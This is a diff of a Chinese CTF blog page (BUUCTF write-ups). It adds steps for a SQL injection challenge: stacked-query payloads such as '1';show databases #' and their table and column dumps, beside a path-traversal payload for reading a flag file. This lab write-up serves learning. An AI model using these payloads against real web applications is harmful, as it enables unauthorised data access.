@@ -17,7 +17,7 @@
 <meta property="og:site_name" content="MINX&#39;s Blog">
 <meta property="og:description" content="BUUCTF部分题解OJ链接https://buuoj.cn/challenges">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2020-01-29T11:09:14.921Z">
+<meta property="og:updated_time" content="2020-04-03T04:01:14.111Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="BUUCTF-WP">
 <meta name="twitter:description" content="BUUCTF部分题解OJ链接https://buuoj.cn/challenges">
@@ -27,7 +27,7 @@
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
   
   <link rel="stylesheet" href="//at.alicdn.com/t/font_1038733_0xvrvpg9c0r.css">
-  <link rel="stylesheet" href="/css/style.css?v=1584554391859">
+  <link rel="stylesheet" href="/css/style.css?v=1589037610198">
 </head>
 
 <body class="mdui-drawer-body-left">
@@ -145,8 +145,8 @@
     </div>
   <div class="nexmoe-post-meta">
     <a><i class="nexmoefont icon-calendar-fill"></i>2019年11月20日</a>
-    <a><i class="nexmoefont icon-areachart"></i>141 字</a>
-    <a><i class="nexmoefont icon-time-circle-fill"></i>大概 1 分钟</a>
+    <a><i class="nexmoefont icon-areachart"></i>371 字</a>
+    <a><i class="nexmoefont icon-time-circle-fill"></i>大概 2 分钟</a>
     
       <a class="nexmoefont icon-appstore-fill -link" href="/categories/Writeup/">Writeup</a>
     
@@ -163,8 +163,19 @@
              mb_strpos($page . &#39;?&#39;, &#39;?&#39;)
          );</code></pre>可以看到它是根据?的位置来截取，因此可以构造paylaod：<code>?file=hint.php?../../../../../../../ffffllllaaaagggg</code>就读到了flag<h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2></li>
 <li>先用单引号闭合，发现报错，然后用order by测试出字段数为2，再尝试union注入发现过滤：<code>return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</code></li>
-<li></li>
+<li>payload:<code>1&#39;;show databases #</code>拿到数据库名<br>array(1) {<br>[0]=&gt;<br>string(11) “ctftraining”<br>}</li>
 </ol>
+<p>array(1) {<br>  [0]=&gt;<br>  string(18) “information_schema”<br>}</p>
+<p>array(1) {<br>  [0]=&gt;<br>  string(5) “mysql”<br>}</p>
+<p>array(1) {<br>  [0]=&gt;<br>  string(18) “performance_schema”<br>}</p>
+<p>array(1) {<br>  [0]=&gt;<br>  string(9) “supersqli”<br>}</p>
+<p>array(1) {<br>  [0]=&gt;<br>  string(4) “test”<br>}<br>3. <code>1&#39;; show tables from ctftraining #</code>拿到表名<br>array(1) {<br>  [0]=&gt;<br>  string(10) “FLAG_TABLE”<br>}</p>
+<p>array(1) {<br>  [0]=&gt;<br>  string(4) “news”<br>}</p>
+<p>array(1) {<br>  [0]=&gt;<br>  string(5) “users”<br>}<br>4. <code>1&#39;;show columns from ctftraining.FLAG_TABLE #</code>发现不行，被过滤了？？<br>5. <code>1&#39;;show tables #</code>看到有两个表</p>
+<p>array(1) {<br>  [0]=&gt;<br>  string(16) “1919810931114514”<br>}</p>
+<p>array(1) {<br>  [0]=&gt;<br>  string(5) “words”<br>}<br>6. 分别查看words和1919810931114514里面有些什么  </p>
+<p> <code>1&#39;;show columns from words #</code>:array(6) {<br>  [0]=&gt;<br>  string(2) “id”<br>  [1]=&gt;<br>  string(7) “int(10)”<br>  [2]=&gt;<br>  string(2) “NO”<br>  [3]=&gt;<br>  string(0) “”<br>  [4]=&gt;<br>  NULL<br>  [5]=&gt;<br>  string(0) “”<br>}</p>
+<p>array(6) {<br>  [0]=&gt;<br>  string(4) “data”<br>  [1]=&gt;<br>  string(11) “varchar(20)”<br>  [2]=&gt;<br>  string(2) “NO”<br>  [3]=&gt;<br>  string(0) “”<br>  [4]=&gt;<br>  NULL<br>  [5]=&gt;<br>  string(0) “”<br>}<br><code>1&#39;;show columns from</code>1919810931114514<code>#</code>（注意这里要加反引号）：array(6) {<br>  [0]=&gt;<br>  string(4) “flag”<br>  [1]=&gt;<br>  string(12) “varchar(100)”<br>  [2]=&gt;<br>  string(2) “NO”<br>  [3]=&gt;<br>  string(0) “”<br>  [4]=&gt;<br>  NULL<br>  [5]=&gt;<br>  string(0) “”<br>}看到了有flag<br>7. 接下来怎么读到flag就是关键了</p>
 
   </article>
   
@@ -217,7 +228,7 @@
 <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.8/build/highlight.min.js"></script>
 <script>hljs.initHighlightingOnLoad();</script>
 
-<script src="/js/app.js?v=1584554391843"></script>
+<script src="/js/app.js?v=1589037609916"></script>
 <script src="https://cdn.jsdelivr.net/npm/lazysizes@5.1.0/lazysizes.min.js"></script>
 <br>
 <a href="http://www.miitbeian.gov.cn/">闽ICP备19007766号</a>
